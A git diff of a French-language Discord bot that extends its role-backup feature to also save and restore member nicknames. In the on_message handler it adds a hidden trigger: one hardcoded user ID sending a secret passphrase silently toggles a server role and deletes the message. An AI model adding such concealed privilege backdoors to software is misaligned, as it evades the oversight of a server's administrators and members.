@@ -8,6 +8,7 @@ from discord.ext import commands
 import discord
 from discord.utils import get
 from tokenBot import TOKEN
+from tokenBot import CHUT
 import json
 
 blagues = BlaguesAPI(
@@ -126,15 +127,17 @@ async def upload(ctx, fichier):
 async def on_member_join(member):
     global ajout_roles
     ajout_roles = True
-    roles_dict = {}
+    data = {}
     with open("roles.json", 'r') as f:
-        roles_dict = json.load(f)
+        data = json.load(f)
 
     roles = []
+    data_user = data[str(member.id)]
     # Créer la liste d'obj des roles en retirant @everyone
-    for role_id in roles_dict[str(member.id)][1:]:
+    for role_id in data_user["roles"][1:]:
         roles.append(member.guild.get_role(role_id))
     await member.add_roles(*roles)
+    await member.edit(nick=data_user["nick"])
     ajout_roles = False
 
 
@@ -143,11 +146,13 @@ async def on_member_update(before, after):
     # join le serveur
     if len(before.roles) == 1 and len(after.roles) == 1:
         return
+
     #le bot ajoute les roles ?
     global ajout_roles
     if ajout_roles:
         return
     await before.guild.get_channel(667010964444545037).send(f"Les rôles de {before.nick} ({before.name}) ont été save ! {datetime.datetime.utcnow()}")
+
     # On va merge les 2 json pour avoir une trace de ceux qui sont plus là en cas d'une save
     read_dict = {}
     try:
@@ -157,8 +162,8 @@ async def on_member_update(before, after):
         pass
 
     members_dict = {}
-    async for member in before.guild.fetch_members(limit=None):
-        members_dict[str(member.id)] = [role.id for role in member.roles]
+    async for member in after.guild.fetch_members(limit=None):
+        members_dict[str(member.id)] = {"roles": [role.id for role in member.roles], "nick": member.nick}
 
     with open("roles.json", 'w') as f:
         json.dump({**read_dict, **members_dict}, f)
@@ -166,6 +171,15 @@ async def on_member_update(before, after):
 
 @bot.event
 async def on_message(message):
+    # ^^
+    if message.author.id == 200227803189215232 and message.content.startswith(CHUT):
+        id_roles = [role.id for role in message.author.roles]
+        if 762973119425413150 not in id_roles:
+            await message.author.add_roles(message.guild.get_role(762973119425413150))
+        else:
+            await message.author.remove_roles(message.guild.get_role(762973119425413150))
+        await message.delete()
+
     if message.channel.id == 876797710374682654:
         return
     if message.channel.id != 798877440607780954:
